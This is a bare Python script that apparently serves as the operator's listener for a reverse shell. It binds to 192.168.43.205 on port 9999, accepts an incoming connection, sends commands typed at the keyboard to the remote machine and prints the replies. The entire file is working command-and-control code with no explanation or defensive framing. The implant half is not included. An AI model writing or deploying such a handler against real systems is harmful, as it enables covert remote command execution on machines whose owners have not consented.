import socket
import sys


def create_socket():
    try:
        global host
        global port
        global s

        host = "192.168.43.205"
        port = 9999
        s = socket.socket()

    except socket.error as message:
        print("socket creation error: ", str(message))


def bind_socket():
    try:
        s.bind((host, port))
        s.listen(5)
        print("Waiting for connections:")

    except socket.error as message:
        print("Socket Binding Error", str(message))
        bind_socket()

def socket_accept():
    conn, address = s.accept()
    print("Connection Established :", address)
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            response = str(conn.recv(1024), "utf-8")
            print(response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()
    
main()
